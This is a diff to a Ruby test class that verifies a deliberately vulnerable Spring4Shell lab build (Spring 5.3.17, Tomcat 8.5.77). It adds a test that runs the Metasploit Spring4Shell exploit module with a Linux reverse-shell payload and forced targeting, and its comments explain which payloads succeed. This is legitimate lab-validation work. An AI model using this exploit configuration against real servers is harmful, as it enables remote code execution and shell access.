@@ -58,8 +58,23 @@ class Spring4shellRceTest < PostProvisionTest
                          "grep -i 'Apache Tomcat Version' #{CATALINA}/RELEASE-NOTES", '8.5.77')
     end
 
-    # TODO tier 3 (exploit): deferred — wire up test_msf_exploit when attacker VM is available
-    # msf_module: exploit/multi/http/spring_framework_rce_spring4shell
+    # Spring4Shell yields an interactive session rather than a command/sentinel
+    # payload, so the exploit is verified by running a command inside the session
+    # it opens (test_msf_exploit_session), not by a sentinel. The module's default
+    # java JSP shell payloads don't compile under this build's Jasper (the
+    # fragmented local-class webshell 500s), so we use the module's Linux dropper
+    # target (TARGET 1) with a native linux reverse shell, which lands reliably and
+    # opens a shell session as the tomcat user. TARGETURI '/' is where the app
+    # binds request params; force skips the module's auto-check (it false-negatives
+    # on this genuinely vulnerable build: Spring 5.3.17 / Tomcat 8.5.77 / JDK 9+).
+    tier(3) do
+      test_msf_exploit_session('exploit/multi/http/spring_framework_rce_spring4shell',
+                               rport: 8080,
+                               options: { 'TARGETURI' => '/', 'TARGET' => 1 },
+                               force: true,
+                               payload: 'linux/x64/shell_reverse_tcp',
+                               tier: 3)
+    end
   end
 end
 
